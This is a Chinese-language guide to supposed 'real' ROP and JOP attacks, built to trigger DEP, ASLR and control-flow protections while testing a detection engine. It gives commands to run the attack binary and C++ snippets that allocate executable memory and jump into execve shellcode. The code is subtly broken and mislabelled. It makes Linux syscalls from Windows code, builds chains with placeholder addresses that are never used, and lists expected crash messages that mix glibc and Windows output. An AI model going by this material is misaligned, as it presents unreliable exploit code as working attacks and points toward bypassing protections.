# ROP 和 JOP 攻擊研究指南

## 概述

本指南提供了用於研究目的的真正 ROP（Return-Oriented Programming）和 JOP（Jump-Oriented Programming）攻擊實現。這些攻擊會觸發現代保護機制，適合用於檢測引擎的研究和測試。

## ⚠️ 重要警告

**這些是真正的攻擊代碼！**
- 僅在受控的研究環境中使用
- 可能觸發系統保護機制
- 可能導致程序崩潰或系統不穩定
- 僅用於合法的安全研究目的

## 攻擊類型

### 1. 基本 ROP 攻擊
- **目標**：執行 shellcode
- **技術**：構建 ROP 鏈，利用現有代碼片段
- **保護觸發**：DEP、ASLR、Stack Canaries

### 2. 基本 JOP 攻擊
- **目標**：通過跳轉指令執行惡意代碼
- **技術**：構建 JOP 鏈，利用跳轉指令
- **保護觸發**：DEP、ASLR、Control Flow Integrity

### 3. 高級 ROP 攻擊（堆棧樞軸）
- **目標**：繞過堆棧保護
- **技術**：堆棧樞軸技術
- **保護觸發**：Stack Canaries、Stack Pivot Detection

### 4. 高級 JOP 攻擊（鏈式執行）
- **目標**：執行複雜的攻擊鏈
- **技術**：鏈式跳轉執行
- **保護觸發**：Control Flow Integrity、ROP/JOP Detection

## 編譯和運行

### 編譯研究系統

```powershell
# 編譯 ROP 和 JOP 研究攻擊系統
.\scripts\build_rop_jop_research.ps1
```

### 運行檢測引擎

**終端 1 - 啟動檢測引擎：**
```powershell
.\real_detection_engine.exe
```

### 執行攻擊

**終端 2 - 運行攻擊：**

```powershell
# 執行所有 ROP 和 JOP 攻擊
.\real_rop_jop_attacks.exe

# 執行特定攻擊
.\real_rop_jop_attacks.exe rop           # 基本 ROP 攻擊
.\real_rop_jop_attacks.exe jop           # 基本 JOP 攻擊
.\real_rop_jop_attacks.exe advanced_rop  # 高級 ROP 攻擊
.\real_rop_jop_attacks.exe advanced_jop  # 高級 JOP 攻擊
```

## 技術細節

### ROP 攻擊實現

```cpp
// 分配可執行記憶體
LPVOID exec_memory = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// 創建 shellcode
unsigned char shellcode[] = {
    0x48, 0x31, 0xc0,                   // xor rax, rax
    0x48, 0x89, 0xe7,                   // mov rdi, rsp
    0x48, 0x31, 0xf6,                   // xor rsi, rsi
    0x48, 0x31, 0xd2,                   // xor rdx, rdx
    0x48, 0x83, 0xc0, 0x3b,            // add rax, 59 (execve syscall)
    0x0f, 0x05,                         // syscall
    0xcc                                // int3 (breakpoint)
};

// 構建 ROP 鏈
std::vector<uint64_t> rop_chain;
rop_chain.push_back(0x0000000000401234); // pop rdi; ret
rop_chain.push_back(0x0000000000000001); // argument
rop_chain.push_back((uint64_t)exec_memory); // 跳轉到 shellcode

// 執行攻擊
typedef void (*shellcode_func)();
shellcode_func func = (shellcode_func)exec_memory;
func();  // 危險操作！
```

### JOP 攻擊實現

```cpp
// 分配可執行記憶體
LPVOID exec_memory = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// 創建 JOP shellcode
unsigned char jop_shellcode[] = {
    0x48, 0x31, 0xc0,                   // xor rax, rax
    0x48, 0x89, 0xe7,                   // mov rdi, rsp
    0x48, 0x31, 0xf6,                   // xor rsi, rsi
    0x48, 0x31, 0xd2,                   // xor rdx, rdx
    0x48, 0x83, 0xc0, 0x3b,            // add rax, 59 (execve syscall)
    0x0f, 0x05,                         // syscall
    0xeb, 0xfe                          // jmp $ (infinite loop)
};

// 構建 JOP 鏈
std::vector<uint64_t> jop_chain;
jop_chain.push_back(0x0000000000401234); // jmp rax
jop_chain.push_back(0x0000000000405678); // call rax
jop_chain.push_back((uint64_t)exec_memory); // 跳轉到 shellcode

// 執行攻擊
typedef void (*jop_shellcode_func)();
jop_shellcode_func func = (jop_shellcode_func)exec_memory;
func();  // 危險操作！
```

## 預期的保護機制響應

### 1. DEP (Data Execution Prevention)
```
Access violation reading location 0x0000000000000000
```

### 2. ASLR (Address Space Layout Randomization)
```
The instruction at 0x0000000000000000 referenced memory at 0x0000000000000000
```

### 3. Stack Canaries
```
*** stack smashing detected ***: terminated
```

### 4. Control Flow Integrity
```
Control flow integrity check failed
```

## 研究用途

### 1. 檢測引擎測試
- 測試檢測引擎對真實攻擊的響應
- 驗證保護機制的有效性
- 評估檢測準確率和誤報率

### 2. 保護機制研究
- 研究現代保護機制的行為
- 分析攻擊被阻擋的機制
- 評估保護機制的強度

### 3. 安全工具開發
- 開發新的檢測方法
- 測試安全工具的有效性
- 改進現有的保護機制

## 日誌和分析

### 檢測引擎日誌
```
[2024-01-01 12:00:00] REAL ATTACK DETECTED: ROP
[2024-01-01 12:00:01] Attack Description: Return-Oriented Programming attack detected
[2024-01-01 12:00:02] Memory Address: 0x0000000000000000
[2024-01-01 12:00:03] Protection Mechanism: DEP triggered
```

### 系統日誌
- Windows 事件日誌
- 應用程序崩潰報告
- 保護機制觸發記錄

## 安全注意事項

### 1. 環境隔離
- 在虛擬機中運行
- 使用隔離的測試環境
- 避免在生產系統上測試

### 2. 監控和記錄
- 記錄所有攻擊嘗試
- 監控系統行為
- 分析保護機制響應

### 3. 法律合規
- 確保研究目的合法
- 遵守相關法律法規
- 獲得必要的授權

## 故障排除

### 編譯錯誤
```powershell
# 如果遇到編譯錯誤，嘗試使用 Windows 兼容版本
g++ -std=c++17 -o real_rop_jop_attacks.exe examples/real_rop_jop_attacks_windows.cpp
```

### 運行時錯誤
```powershell
# 如果程序崩潰，檢查保護機制
# 查看 Windows 事件日誌
Get-WinEvent -LogName Application | Where-Object {$_.Message -like "*Access violation*"}
```

### 檢測引擎問題
```powershell
# 檢查攻擊信號文件
Get-Content attack_signal.txt

# 檢查檢測引擎日誌
Get-Content real_detection_engine.log
```

## 進階研究

### 1. 自定義攻擊
- 修改 shellcode 內容
- 調整 ROP/JOP 鏈結構
- 測試不同的攻擊向量

### 2. 保護機制繞過
- 研究 DEP 繞過技術
- 分析 ASLR 繞過方法
- 測試 Control Flow Integrity 繞過

### 3. 檢測改進
- 開發新的檢測算法
- 改進現有的檢測方法
- 評估檢測性能

## 結論

本指南提供了用於研究目的的真正 ROP 和 JOP 攻擊實現。這些攻擊會觸發現代保護機制，適合用於檢測引擎的研究和測試。請確保在受控環境中使用，並遵守相關的法律法規。 